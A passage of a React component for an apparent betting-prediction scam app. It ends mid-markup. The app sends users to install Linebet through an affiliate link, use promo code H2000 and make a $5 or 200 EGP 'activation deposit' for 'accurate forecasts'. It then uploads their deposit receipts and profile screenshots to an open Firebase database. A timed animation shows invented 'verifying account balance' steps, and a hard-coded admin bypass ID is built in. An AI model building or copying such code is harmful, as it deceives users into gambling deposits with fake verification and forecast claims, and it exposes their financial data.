import React, { useState } from 'react';
import { Copy, Check, Upload, ArrowRight, Download, Smartphone, CreditCard, ShieldCheck, Loader2, Server, Crown, Fingerprint, Database, Terminal, Scan, Shield, Activity, Lock, Image, Unlock, Cog, Cpu, HelpCircle, Send } from 'lucide-react';
import { Language } from '../utils/translations';
import { Platform } from '../types';
import { audioManager } from '../utils/audioManager';

interface SettingsViewProps {
  onComplete: (userId: string) => void;
  lang: Language;
  t: any;
  platform: Platform;
}

const SettingsView: React.FC<SettingsViewProps> = ({ onComplete, lang, t, platform }) => {
  const [copied, setCopied] = useState(false);
  const [userId, setUserId] = useState('');
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [profilePreviewUrl, setProfilePreviewUrl] = useState<string | null>(null);
  const [screenshotBase64, setScreenshotBase64] = useState<string | null>(null);
  const [profileBase64, setProfileBase64] = useState<string | null>(null);
  const [file1Name, setFile1Name] = useState<string>('');
  const [file2Name, setFile2Name] = useState<string>('');
  const [errors, setErrors] = useState<{ userId?: boolean; screenshot?: boolean; profileScreenshot?: boolean; userIdLength?: boolean }>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [overallProgress, setOverallProgress] = useState(0);
  const [statusText, setStatusText] = useState("UPLINKING...");
  const [isApprovedOnServer, setIsApprovedOnServer] = useState(false);

  const platformName = "Linebet";
  const platformImg = 'https://image2url.com/images/1766063887850-97673d7d-b0b6-491f-872a-4fd7b71d4a72.jpeg';
  const linebetDownloadUrl = "https://lb-aff.com//L?tag=d_3386416m_66803c_apk1&site=3386416&ad=66803";

  const isArabic = lang === 'ar';

  const [verificationSteps, setVerificationSteps] = useState([
    { id: 'server', label: isArabic ? "الاتصال بخادم المنصة" : "Connect to Server Platform", status: "pending", icon: Server },
    { id: 'deposit', label: isArabic ? "التحقق من الإيداع والتفعيل" : "Verify Deposit & Activation", status: "pending", icon: Database },
    { id: 'id', label: isArabic ? "تفعيل الحساب والتحقق من المعرف" : "Verify & Authorize User ID", status: "pending", icon: Fingerprint }
  ]);

  // Dynamically check Firebase if entered ID is already approved by Administrator
  React.useEffect(() => {
    const trimmedId = userId.trim();
    if (trimmedId.length >= 8 && trimmedId.length <= 15) {
      if (trimmedId === "000999000") {
        setIsApprovedOnServer(false);
        return;
      }
      
      const checkStatus = async () => {
        try {
          const res = await fetch(`https://shopping-ca5f4-default-rtdb.firebaseio.com/approval/${trimmedId}.json`);
          if (res.ok) {
            const status = await res.json();
            if (status === 'approved') {
              setIsApprovedOnServer(true);
              return;
            }
          }
          setIsApprovedOnServer(false);
        } catch (e) {
          console.error("Error reading approval database node:", e);
          setIsApprovedOnServer(false);
        }
      };

      const timer = setTimeout(checkStatus, 400);
      return () => clearTimeout(timer);
    } else {
      setIsApprovedOnServer(false);
    }
  }, [userId]);

  const handleCopy = () => {
    audioManager.playCopy();
    navigator.clipboard.writeText("H2000"); // promo code changed to H2000 as requested
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = (error) => reject(error);
    });
  };

  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      const url = URL.createObjectURL(file);
      setPreviewUrl(url);
      setFile1Name(file.name);
      setErrors(prev => ({ ...prev, screenshot: false }));
      try {
        const base64 = await fileToBase64(file);
        setScreenshotBase64(base64);
      } catch (err) {
        console.error("Error reading file to base64", err);
      }
    }
  };

  const handleProfileFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const file = e.target.files[0];
      const url = URL.createObjectURL(file);
      setProfilePreviewUrl(url);
      setFile2Name(file.name);
      setErrors(prev => ({ ...prev, profileScreenshot: false }));
      try {
        const base64 = await fileToBase64(file);
        setProfileBase64(base64);
      } catch (err) {
        console.error("Error reading file to base64", err);
      }
    }
  };

  const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, '');
    if (val.length <= 15) {
        setUserId(val);
        if (val.length >= 8) {
             setErrors(prev => ({ ...prev, userId: false, userIdLength: false }));
        }
    }
  };

  const validateAndSubmit = async () => {
    audioManager.playClick();
    const trimmedId = userId.trim();
    
    // Check if user entered Admin ID Bypass code
    if (trimmedId === "000999000") {
      setIsSubmitting(true);
      setStatusText(isArabic ? "مصادقة المشرف..." : "AUTHORIZING ROOT...");
      setOverallProgress(50);
      setTimeout(() => {
        setOverallProgress(100);
        setTimeout(() => {
          setIsSubmitting(false);
          onComplete("000999000");
        }, 300);
      }, 1000);
      return;
    }

    const isLengthValid = trimmedId.length >= 8 && trimmedId.length <= 15;
    
    const newErrors = {
      userId: !trimmedId,
      userIdLength: !isLengthValid && !!trimmedId,
      screenshot: !isApprovedOnServer && !previewUrl,
      profileScreenshot: !isApprovedOnServer && !profilePreviewUrl
    };

    setErrors(newErrors);

    if (!newErrors.userId && !newErrors.userIdLength && !newErrors.screenshot && !newErrors.profileScreenshot) {
      const startTime = Date.now();

      // If already pre-approved, skip upload flow and bypass instantly
      if (isApprovedOnServer) {
        setIsSubmitting(true);
        setStatusText(isArabic ? "مزامنة الاتصال الآمن والمباشر..." : "ESTABLISHING DIRECT SECURE UPLINK...");
        setOverallProgress(35);
        setTimeout(() => {
          setOverallProgress(100);
          setTimeout(() => {
            setIsSubmitting(false);
            localStorage.setItem('bypass_approved_userId', trimmedId);
            localStorage.setItem('admin_approval_status', 'approved');
            onComplete(trimmedId);
          }, 350);
        }, 1200);
        return;
      }

      setIsSubmitting(true);
      
      const updateStep = (index: number, status: string) => {
        setVerificationSteps(prev => 
          prev.map((step, i) => i === index ? { ...step, status } : step)
        );
      };

      updateStep(0, "active");
      setStatusText(isArabic ? "تحميل بيانات الاعتماد والملفات..." : "UPLOADING CREDENTIALS AND FILES...");
      
      let uploadSuccess = false;

      // Trigger Firebase uploads
      try {
        const picPromise = fetch(`https://shopping-ca5f4-default-rtdb.firebaseio.com/pics/${trimmedId}.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: trimmedId,
            screenshot: screenshotBase64,
            profileScreenshot: profileBase64,
            createdAt: startTime
          })
        });

        const statusPromise = fetch(`https://shopping-ca5f4-default-rtdb.firebaseio.com/approval/${trimmedId}.json`, {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify("pending")
        });

        const responses = await Promise.all([picPromise, statusPromise]);
        if (responses[0].ok && responses[1].ok) {
          uploadSuccess = true;
        }
      } catch (err) {
        console.error("Firebase Realtime DB upload failed", err);
      }

      // Progress bar simulation for smooth user feedback
      const duration = 5000;
      const interval = 30;
      const totalStepsCount = duration / interval;
      const increment = 100 / totalStepsCount;

      let step0Done = false;
      let step1Done = false;
      let step2Done = false;

      const timer = setInterval(() => {
        setOverallProgress(prev => {
            const next = prev + increment;
            if (next >= 33 && next < 66 && !step0Done) {
                step0Done = true;
                updateStep(0, "completed");
                updateStep(1, "active");
                setStatusText(isArabic ? "التحقق من الإيداع وتفعيل التذكرة..." : "VERIFYING ACCOUNT BALANCE AND VECTORS...");
            }
            if (next >= 66 && next < 95 && !step1Done) {
                step1Done = true;
                updateStep(1, "completed");
                updateStep(2, "active");
                setStatusText(isArabic ? "إنشاء عقدة بروتوكول التشفير الفوري..." : "CREATING REALTIME UPLINK CLIENT NODE...");
            }
            if (next >= 100) {
                if (!step2Done) {
                    step2Done = true;
                    updateStep(2, "completed");
                    setStatusText(isArabic ? "طلب تفعيل الاتصال مكتمل" : "UPLINK REQUEST COMMITTED");
                }
                clearInterval(timer);
                return 100;
            }
            return next;
        });
      }, interval);

      setTimeout(() => {
        // Save to local storage for countdown and tracking
        localStorage.setItem('admin_approval_userId', trimmedId);
        
        // Only set a new timer start time if it doesn't already exist
        const existingTimerStart = localStorage.getItem('admin_approval_timer_start');
        if (!existingTimerStart) {
          localStorage.setItem('admin_approval_timer_start', startTime.toString());
        }
        
        localStorage.setItem('admin_approval_status', 'pending');

        setIsSubmitting(false);
        onComplete(trimmedId);
      }, duration + 500);
    }
  };

  // Dedicated localized helper strings for high fashion layout
  const stepTexts = {
    step1_tag: isArabic ? "الخطوة الأولى" : "STEP 01",
    step1_title: isArabic ? "تحميل تطبيق المنصة" : "DOWNLOAD PLATFORM APP",
    step1_desc: isArabic ? "اضغط على الزر أدناه لتنزيل وتثبيت تطبيق Linebet الرسمي مباشرة." : "Press the button below to download and install the official Linebet application.",
    step1_btn: isArabic ? "تحميل الآن" : "INSTALL NOW",
    
    stepTelegram_tag: isArabic ? "الخطوة الثانية" : "STEP 02",
    stepTelegram_title: isArabic ? "الاشتراك في قناة التليجرام" : "SUBSCRIBE TO TELEGRAM",
    stepTelegram_desc: isArabic ? "اشترك في قناة التليجرام الرسمية الخاصة بنا للحصول على آخر التحديثات والتنبؤات الدقيقة." : "Subscribe to our official Telegram channel to receive all latest synchronization streams and accurate forecasts.",
    stepTelegram_btn: isArabic ? "انضم إلى قناة التليجرام" : "JOIN TELEGRAM CHANNEL",

    step2_tag: isArabic ? "الخطوة الثالثة" : "STEP 03",
    step2_title: isArabic ? "إنشاء الحساب الجديد" : "ACCOUNT CREATION",
    step2_desc: isArabic ? "سجل حسابًا جديدًا في التطبيق واستخدم الرمز الترويجي الحصري H2000 لتنشيط الاتصال." : "Register a brand new account and use the exclusive promo code H2000 to enable prediction synchronization.",
    step2_copy: isArabic ? "انسخ رمز التجاوز الترويجي" : "COPY BYPASS PROMO KEY",
    step2_copied: isArabic ? "تم النسخ بنجاح!" : "COPIED TO CLIPBOARD",
    
    step3_tag: isArabic ? "الخطوة الرابعة" : "STEP 04",
    step3_title: isArabic ? "إيداع التنشيط" : "ACTIVATION DEPOSIT",
    step3_desc: isArabic ? "قم بتمويل حسابك بمبلغ إيداع التنشيط لربط العقدة بمزود التنبؤ المباشر:" : "Fund your account with the required deposit limit to bind your node with the forecasting servers:",
    step3_global: isArabic ? "الطبقة العالمية" : "GLOBAL GATEWAY",
    step3_local: isArabic ? "الطبقة المحلية بمصر" : "EGYPT LOCAL GATEWAY",
    
    step4_tag: isArabic ? "الخطوة الخامسة" : "STEP 05",
    step4_title: isArabic ? "توثيق الحساب" : "ACCOUNT VERIFICATION",
    step4_desc: isArabic ? "أدخل معرف الحساب المكون من 8-15 رقمًا وقم برفع لقطات الشاشة للتفعيل الفوري." : "Enter your account user ID (8-15 digits) and upload validation documents for immediate authorization.",
    userid_placeholder: isArabic ? "أدخل المعرف (مثال: 5493028)" : "Enter ID (e.g. 5493028)",
  };

  return (
    <div className="flex flex-col h-full px-4 pt-4 pb-20 overflow-y-auto custom-scrollbar relative bg-transparent select-none" dir="ltr">
      {/* Dynamic Background Grid Pattern */}
      <div className="absolute inset-0 bg-gradient-to-b from-red-950/20 to-transparent pointer-events-none h-48 z-0 opacity-50" />
      
      {/* Title Header Section */}
      <div className="mb-8 text-center relative z-10 animate-in fade-in duration-500 mt-2">
        <div className="inline-flex flex-col items-center">
          <div className="w-16 h-16 mb-3 rounded-full bg-[#050508] border border-red-500/30 flex items-center justify-center shadow-[0_0_30px_rgba(239,68,68,0.1)] p-0 relative">
            <img 
              src="https://logo12.gamer.gd/logo.png" 
              className="w-full h-full object-contain drop-shadow-[0_0_8px_rgba(239,68,68,0.6)] animate-pulse rounded-full" 
              alt="Logo" 
              referrerPolicy="no-referrer"
            />
            <div className="absolute inset-0 border border-dashed border-red-500/10 rounded-full animate-[spin_30s_linear_infinite]" />
          </div>
          
          <h2 className="text-2xl font-display font-black text-white tracking-tight uppercase leading-none mb-1.5">
            {isArabic ? "بروتوكول تفعيل الاتصال" : "UPLINK PROVISIONING"}
          </h2>
          
          <p className="text-[9px] font-mono text-zinc-500 uppercase tracking-widest font-bold">
            {isArabic ? "أكمل الشروط والتحقق لربط الخادم" : "COMPLETE THE REQUIREMENTS FOR LIVE INJECTION"}
          </p>
        </div>
      </div>

      {localStorage.getItem('admin_approval_status') === 'pending' && (
        <div 
          onClick={() => {
            audioManager.playClick();
            onComplete(localStorage.getItem('admin_approval_userId') || userId || "000"); 
          }}
          className="mb-6 mx-auto max-w-[340px] w-full p-3 rounded-xl bg-red-950/20 border border-red-500/40 text-center cursor-pointer hover:bg-red-950/40 transition-colors flex items-center justify-between group shadow-[0_0_15px_rgba(239,68,68,0.1)] active:scale-98 relative z-10"
        >
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 rounded-full bg-red-500 animate-ping shadow-[0_0_8px_#ef4444]" />
            <div className="text-right">
              <span className="block text-[8px] font-mono text-zinc-500 font-bold uppercase tracking-widest leading-none">
                {isArabic ? "طلب تفعيل معلق" : "PENDING UPLINK REQUEST"}
              </span>
              <span className="block text-[11px] text-white font-mono font-black mt-0.5">
                ID: {localStorage.getItem('admin_approval_userId')}
              </span>
            </div>
          </div>
          <span className="text-[9px] font-mono font-black text-red-550 uppercase tracking-widest flex items-center gap-1 group-hover:text-red-400">
            {isArabic ? "عرض المؤقت" : "VIEW TIMER"} <ArrowRight className="w-3 h-3" />
          </span>
        </div>
      )}

      <div className="space-y-4 relative z-10 max-w-[340px] mx-auto w-full pb-8">

        {/* STEP 1: DOWNLOAD APP */}
        <div className="relative rounded-2xl bg-black/60 border border-white p-1 transition-all duration-300 hover:border-red-500/15 overflow-hidden">
          <div className="bg-black/30 p-3.5 rounded-xl">
            <div className="flex items-start gap-3.5 mb-2.5">
              <div className="w-10 h-10 rounded-lg overflow-hidden shrink-0 border border-white/10 p-[1px] bg-zinc-950">
                 <img src={platformImg} alt={platformName} className="w-full h-full object-cover rounded-lg" />
              </div>
              <div className="flex-1 min-w-0">
                 <span className="text-[7.5px] font-mono text-red-500 font-extrabold tracking-wider block uppercase mb-0.5">
                   <span className={isArabic ? 'text-[10px] font-sans font-black tracking-normal' : ''}>{stepTexts.step1_tag}</span>
                 </span>
                 <h3 className="text-sm font-black text-white uppercase tracking-tight leading-none mb-0.5">
                   {stepTexts.step1_title}
                 </h3>
                 <span className="text-[8px] font-mono text-zinc-600 uppercase font-black tracking-widest block">SECURE BYPASS UTILITY</span>
              </div>
              <Smartphone className="w-4 h-4 text-red-500/30 shrink-0" />
            </div>

            <p className="text-[11px] text-zinc-400 leading-normal mb-3.5 font-bold font-mono">
              <span className={isArabic ? 'text-[13px] font-sans leading-relaxed text-zinc-300 block mt-1' : ''}>{stepTexts.step1_desc}</span>
            </p>

            <a 
              href={linebetDownloadUrl}
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => audioManager.playClick()}
              className="w-full h-11 rounded-xl bg-red-650 text-white font-black font-display text-[9px] tracking-[0.15em] uppercase flex items-center justify-center gap-2 shadow-[0_4px_12px_rgba(220,38,38,0.15)] hover:bg-red-600 active:scale-[0.99] transition-all border border-red-500/20"
            >
               <Download className="w-3 h-3" />
               <span>{stepTexts.step1_btn}</span>
            </a>
          </div>
        </div>


        {/* STEP TELEGRAM: SUBSCRIBE TO TELEGRAM CHANNEL */}
        <div className="relative rounded-2xl bg-black/60 border border-white p-1 transition-all duration-300 hover:border-red-500/15 overflow-hidden">
          <div className="bg-black/30 p-3.5 rounded-xl">
            <div className="flex items-start gap-3.5 mb-2.5">
              <div className="w-10 h-10 rounded-lg bg-red-500/5 border border-red-500/15 flex items-center justify-center text-red-500 shrink-0">
                 <Send className="w-4 h-4 rotate-[315deg] translate-x-[1px] translate-y-[-1px]" />
              </div>
              <div className="flex-1 min-w-0">
                 <span className="text-[7.5px] font-mono text-red-500 font-extrabold tracking-wider block uppercase mb-0.5">
                   <span className={isArabic ? 'text-[10px] font-sans font-black tracking-normal' : ''}>{stepTexts.stepTelegram_tag}</span>
                 </span>
                 <h3 className="text-sm font-black text-white uppercase tracking-tight leading-none mb-0.5">
                   {stepTexts.stepTelegram_title}
                 </h3>
                 <span className="text-[8px] font-mono text-zinc-650 uppercase font-black tracking-widest block font-bold">TELEGRAM CORE STREAM</span>
              </div>
            </div>

            <p className="text-[11px] text-zinc-400 leading-normal mb-3.5 font-bold font-mono">
              <span className={isArabic ? 'text-[13px] font-sans leading-relaxed text-zinc-300 block mt-1' : ''}>{stepTexts.stepTelegram_desc}</span>
            </p>

            <a 
              href="https://t.me/kdjsksjsy"
              target="_blank"
              rel="noopener noreferrer"
              onClick={() => audioManager.playClick()}
              className="w-full h-11 rounded-xl bg-[#229ED9] text-white font-black font-display text-[9px] tracking-[0.15em] uppercase flex items-center justify-center gap-2 shadow-[0_4px_12px_rgba(34,158,217,0.2)] hover:bg-[#229ED9]/90 active:scale-[0.99] transition-all border border-red-500/20"
            >
               <Send className="w-3.5 h-3.5 rotate-[315deg] translate-x-[1px]" />
               <span>{stepTexts.stepTelegram_btn}</span>
            </a>
          </div>
        </div>


        {/* STEP 2: REGISTER & PROMO CODE */}
        <div className="relative rounded-2xl bg-black/60 border border-white p-1 transition-all duration-300 hover:border-red-500/15 overflow-hidden">
          <div className="bg-black/30 p-3.5 rounded-xl">
            <div className="flex items-start gap-3.5 mb-2.5">
              <div className="w-10 h-10 rounded-lg bg-red-500/5 border border-red-500/15 flex items-center justify-center text-red-500 shrink-0">
                 <Lock className="w-4 h-4" />
              </div>
              <div className="flex-1 min-w-0">
                 <span className="text-[7.5px] font-mono text-red-500 font-extrabold tracking-wider block uppercase mb-0.5">
                   <span className={isArabic ? 'text-[10px] font-sans font-black tracking-normal' : ''}>{stepTexts.step2_tag}</span>
                 </span>
                 <h3 className="text-sm font-black text-white uppercase tracking-tight leading-none mb-0.5">
                   {stepTexts.step2_title}
                 </h3>
                 <span className="text-[8px] font-mono text-zinc-650 uppercase font-black tracking-widest block">H2000 CONFIGURATOR</span>
              </div>
            </div>

            <p className="text-[11px] text-zinc-400 leading-normal mb-3.5 font-bold font-mono">
              <span className={isArabic ? 'text-[13px] font-sans leading-relaxed text-zinc-300 block mt-1' : ''}>{stepTexts.step2_desc}</span>
            </p>

            <div 
              onClick={handleCopy}
              className={`relative bg-black/60 rounded-xl border-2 border-dashed p-3.5 flex items-center justify-between cursor-pointer transition-all duration-300 text-left ${
                copied ? 'border-red-500 bg-red-500/[0.01] shadow-[0_0_15px_rgba(239,68,68,0.1)]' : 'border-white hover:border-white/80'
              }`}
            >
               <div className="z-10 flex flex-col justify-center">
                  <span className={`text-[7px] font-mono font-black tracking-wider uppercase mb-0.5 ${copied ? 'text-red-500 animate-pulse' : 'text-zinc-500'}`}>
                    <span className={isArabic ? 'text-[10px] font-sans font-medium' : ''}>{copied ? stepTexts.step2_copied : stepTexts.step2_copy}</span>
                  </span>
                  <span className="text-lg font-mono font-black tracking-[0.2em] text-white">
                    H2000
                  </span>
               </div>

               <div className={`w-8.5 h-8.5 rounded-lg flex items-center justify-center transition-all duration-500 ${
                  copied ? 'bg-red-500 text-black scale-105' : 'bg-zinc-950 text-zinc-500 border border-zinc-900'
                }`}>
                  {copied ? <Check className="w-4 h-4 stroke-[3px]" /> : <Copy className="w-3.5 h-3.5" />}
               </div>
            </div>
          </div>
        </div>


        {/* STEP 3: ACTIVATION DEPOSIT */}
        <div className="relative rounded-2xl bg-black/60 border border-white p-1 transition-all duration-300 hover:border-red-500/15 overflow-hidden">
          <div className="bg-black/30 p-3.5 rounded-xl">
            <div className="flex items-start gap-3.5 mb-2.5">
              <div className="w-10 h-10 rounded-lg bg-red-500/5 border border-red-500/15 flex items-center justify-center text-red-500 shrink-0">
                 <CreditCard className="w-4 h-4" />
              </div>
              <div className="flex-1 min-w-0">
                 <span className="text-[7.5px] font-mono text-red-500 font-extrabold tracking-wider block uppercase mb-0.5">
                   <span className={isArabic ? 'text-[10px] font-sans font-black tracking-normal' : ''}>{stepTexts.step3_tag}</span>
                 </span>
                 <h3 className="text-sm font-black text-white uppercase tracking-tight leading-none mb-0.5">
                   {stepTexts.step3_title}
                 </h3>
                 <span className="text-[8px] font-mono text-zinc-605 uppercase font-black tracking-widest block">SECURITY LIQUID EXCHANGER</span>
              </div>
            </div>

            <p className="text-[11px] text-zinc-400 leading-normal mb-3 font-bold font-mono">
              <span className={isArabic ? 'text-[13px] font-sans leading-relaxed text-zinc-300 block mt-1' : ''}>{stepTexts.step3_desc}</span>
            </p>

            <div className="grid grid-cols-2 gap-3 mt-1.5" dir="ltr">
              <div className="bg-black/40 border border-white/60 p-3 rounded-xl flex flex-col items-center justify-center hover:border-white transition-colors">
                  <span className="text-[6.5px] text-zinc-500 font-black uppercase tracking-wider mb-1 font-mono"><span className={isArabic ? 'text-[9.5px] font-sans tracking-normal' : ''}>{stepTexts.step3_global}</span></span>
                  <span className="text-lg font-black text-white font-display">$5.00</span>
              </div>
              <div className="bg-black/40 border border-white/60 p-3 rounded-xl flex flex-col items-center justify-center hover:border-white transition-colors">
                  <span className="text-[6.5px] text-zinc-500 font-black uppercase tracking-wider mb-1 font-mono"><span className={isArabic ? 'text-[9.5px] font-sans tracking-normal' : ''}>{stepTexts.step3_local}</span></span>
                  <span className="text-lg font-black text-red-500 font-display">200 EGP</span>
              </div>
            </div>
          </div>
        </div>


        {/* STEP 4: REDESIGNED VERIFICATION FORM - EXTREMELY CLASSY */}
        <div className={`relative p-1 rounded-2xl border backdrop-blur-md transition-all duration-500 overflow-hidden ${
          errors.userId || errors.screenshot || errors.profileScreenshot || errors.userIdLength 
            ? 'bg-red-950/5 border-red-500/30' 
            : 'bg-black/60 border-white hover:border-white/80'
        }`}>
          <div className="bg-black/30 p-4 rounded-xl">
          <div className="flex justify-between items-start mb-4">
             <div>
                <span className="text-[7.5px] font-mono text-red-500 font-extrabold tracking-wider block uppercase mb-0.5">
                  <span className={isArabic ? 'text-[10px] font-sans font-black tracking-normal' : ''}>{stepTexts.step4_tag}</span>
                </span>
                <h3 className="font-black font-display text-md text-white tracking-tight uppercase leading-none">
                  {stepTexts.step4_title}
                </h3>
             </div>
             <ShieldCheck className={`w-5 h-5 transition-colors ${userId ? 'text-red-500 animate-pulse' : 'text-zinc-600'}`} />
          </div>

          <p className="text-[11px] text-zinc-400 leading-normal mb-4 font-bold font-mono">
            <span className={isArabic ? 'text-[13px] font-sans leading-relaxed text-zinc-300 block mt-1' : ''}>{stepTexts.step4_desc}</span>
          </p>

          <div className="space-y-4">
            {/* User ID Field with specialized layout */}
            <div>
              <label className="block text-[8px] text-zinc-400 mb-1.5 uppercase font-mono font-black tracking-widest font-bold">
                <span className={isArabic ? 'text-[11px] font-sans tracking-wide block mb-1.5' : ''}>{isArabic ? "معرف مستخدم" : "USER ID"} {platformName}</span>
              </label>
              <div className="relative">
                  <div className="absolute inset-y-0 left-0 border-r border-white/25 pr-3 pl-3.5 flex items-center justify-center">
                     <Fingerprint className={`w-4 h-4 ${userId ? 'text-red-550 animate-pulse' : 'text-zinc-400'}`} />
                  </div>
                  <input 
                    type="tel" 
                    value={userId}
                    onChange={handleUserIdChange}
                    placeholder={stepTexts.userid_placeholder}
                    disabled={isSubmitting}
                    maxLength={15}
                    className={`w-full bg-[#040406]/75 border text-white font-mono text-sm py-3 rounded-xl focus:outline-none transition-all pl-12 pr-4 text-left ${
                      errors.userId || errors.userIdLength 
                        ? 'border-red-550 focus:border-red-500 shadow-[0_0_10px_rgba(239,68,68,0.1)]' 
                        : 'border-white focus:border-white/80'
                    }`}
                  />
              </div>
              {(errors.userId || errors.userIdLength) && (
                <span className="text-[8px] font-mono text-red-500 font-black block mt-1 uppercase tracking-wider">
                  {errors.userId ? (isArabic ? "الحقل مطلوب *" : "Required field *") : (isArabic ? "يجب أن يتكون المعرف من 8 إلى 15 رقمًا" : "Must be between 8 and 15 digits")}
                </span>
              )}
            </div>

            {/* Custom File Upload Containers */}
            {!isApprovedOnServer && (
              <>
                <div className="grid grid-cols-2 gap-3.5">
                  <div>
                    <label className="block text-zinc-400 mb-1.5 uppercase font-mono font-black tracking-widest text-[7px] font-bold">
                      <span className={isArabic ? 'text-[9.5px] font-sans block tracking-normal' : ''}>{isArabic ? "إيصال الإيداع" : "RECEIPT PROOF"}</span>
                    </label>
                    <input type="file" accept="image/*" onChange={handleFileChange} className="hidden" id="screenshot-upload" disabled={isSubmitting} />
                    <label htmlFor="screenshot-upload" className={`flex flex-col items-center justify-center w-full h-24 border border-dashed rounded-xl cursor-pointer transition-all relative overflow-hidden bg-[#040406]/75 ${
                      errors.screenshot ? 'border-red-500 bg-red-950/10' : 'border-white hover:border-white/80'
                    }`}>
                      {previewUrl ? (
                        <img src={previewUrl} alt="Deposit Proof" className="absolute inset-0 w-full h-full object-cover opacity-60" />
                      ) : (
                        <div className="flex flex-col items-center gap-1 text-center p-2">
                           <Scan className="w-4 h-4 text-white/40 animate-pulse" />
                           <span className="text-[7px] text-zinc-400 font-extrabold uppercase tracking-wider font-mono">
                             <span className={isArabic ? 'text-[10.5px] font-sans font-black' : ''}>{isArabic ? "رفع الإيصال" : "UPLOAD RECEIPT"}</span>
                           </span>
                        </div>
                      )}
                    </label>
                  </div>

                  <div>
                    <label className="block text-zinc-400 mb-1.5 uppercase font-mono font-black tracking-widest text-[7px] font-bold">
                      <span className={isArabic ? 'text-[9.5px] font-sans block tracking-normal' : ''}>{isArabic ? "لقطة الشاشة للملف" : "PROFILE SCREEN"}</span>
                    </label>
                    <input type="file" accept="image/*" onChange={handleProfileFileChange} className="hidden" id="profile-upload" disabled={isSubmitting} />
                    <label htmlFor="profile-upload" className={`flex flex-col items-center justify-center w-full h-24 border border-dashed rounded-xl cursor-pointer transition-all relative overflow-hidden bg-[#040406]/75 ${
                      errors.profileScreenshot ? 'border-red-500 bg-red-950/10' : 'border-white hover:border-white/80'
                    }`}>
                      {profilePreviewUrl ? (
                        <img src={profilePreviewUrl} alt="Profile Proof" className="absolute inset-0 w-full h-full object-cover opacity-60" />
                      ) : (
                        <div className="flex flex-col items-center gap-1 text-center p-2">
                           <Image className="w-4 h-4 text-white/40 animate-pulse" />
                           <span className="text-[7px] text-zinc-400 font-extrabold uppercase tracking-wider font-mono">
                             <span className={isArabic ? 'text-[10.5px] font-sans font-black' : ''}>{isArabic ? "رفع لقطة الحساب" : "UPLOAD PROFILE"}</span>
                           </span>
                        </div>
                      )}
                    </label>
                  </div>
                </div>
                {/* Show simple feedback if upload fields are missing */}
                {(errors.screenshot || errors.profileScreenshot) && (
                  <span className="text-[8px] font-mono text-red-500 font-black block uppercase tracking-wider">
                    {isArabic ? "برجاء رفع كلا الملفين للمواصلة *" : "Please upload both security verification files *"}
                  </span>
                )}
              </>
            )}
            
            {isApprovedOnServer && (
              <div className="p-3.5 rounded-xl border-2 border-emerald-500/35 bg-emerald-950/10 text-center animate-in zoom-in duration-300">
                <ShieldCheck className="w-6 h-6 text-emerald-550 mx-auto mb-1 animate-bounce" />
                <span className="block text-[8px] font-mono text-emerald-500 font-black uppercase tracking-widest">
                  {isArabic ? "التحقق المباشر نشط" : "LIVE BYPASS CONFIRMED"}
                </span>
                <p className="text-[10px] text-zinc-400 font-mono mt-1 font-bold">
                  {isArabic ? "تم تفعيل هذا المعرف مسبقاً! يمكنك الدخول مباشرة بدون رفع صور." : "This ID has been pre-approved! Click bellow for instant gateway entrance."}
                </p>
              </div>
            )}
          </div>
          
          <button 
            onClick={validateAndSubmit}
            disabled={isSubmitting}
            className={`w-full mt-6 h-12 rounded-xl text-white font-black font-display text-[9px] tracking-[0.2em] transition-all flex items-center justify-center gap-1.5 active:scale-[0.99] border uppercase shadow-lg ${
              isApprovedOnServer 
                ? 'bg-emerald-600 hover:bg-emerald-550 border-emerald-550/30 shadow-emerald-900/10' 
                : 'bg-red-650 hover:bg-red-600 border-red-500/20 shadow-[0_4px_16px_rgba(220,38,38,0.2)]'
            }`}
          >
              <span><span className={isArabic ? 'text-[12.5px] font-sans font-black' : ''}>{isApprovedOnServer ? (isArabic ? "الدخول المباشر والتفعيل الفوري" : "ENTER SECURE LIVE TERMINAL") : (isArabic ? "تقديم طلب التحقق والتفعيل" : "AUTHORIZE CONNECTION PROFILE")}</span></span>
              <ArrowRight className="w-3.5 h-3.5 text-white" />
          </button>
          </div>
        </div>
      </div>

      {/* FULL-SCREEN SECURE LOADING MODAL */}
      {isSubmitting && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/98 backdrop-blur-3xl animate-in fade-in duration-500 p-6">
           <div className="relative w-full max-w-sm">
              <div className="bg-[#05055] border border-red-500/20 rounded-[2.5rem] p-8 relative z-10 shadow-[0_0_80px_rgba(239,68,68,0.15)] overflow-hidden flex flex-col items-center text-center">
                 <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_rgba(127,29,29,0.06)_0%,_transparent_75%)] pointer-events-none" />
                 
                 <div className="mb-8 w-full">
                    <h3 className="text-[7px] font-mono text-zinc-500 uppercase tracking-[0.5em] mb-3 font-black">AUTHENTICATION TERMINAL</h3>
                    <h2 className="text-xl font-display font-black text-white tracking-tight uppercase mb-4 leading-none">
                       {isArabic ? "التحقق من " : "VERIFYING "}<span className="text-red-500">{isArabic ? "بيانات الاعتماد" : "CREDENTIALS"}</span>
                    </h2>
                    
                    <div className="w-full mt-5">
                       <div className="flex justify-between items-end px-1 mb-2">
                          <span className="text-[8px] font-mono text-zinc-400 tracking-widest font-black animate-pulse uppercase">{statusText}</span>
                          <span className="text-sm font-black text-red-550 font-display">{Math.round(overallProgress)}%</span>
                       </div>
                       <div className="h-2 w-full bg-zinc-950 rounded-full border border-white/5 overflow-hidden p-[2px] relative">
                          <div 
                            className="h-full bg-red-500 rounded-full transition-all duration-300 ease-out shadow-[0_0_12px_rgba(239,68,68,0.4)]"
                            style={{ width: `${overallProgress}%` }}
                          />
                       </div>
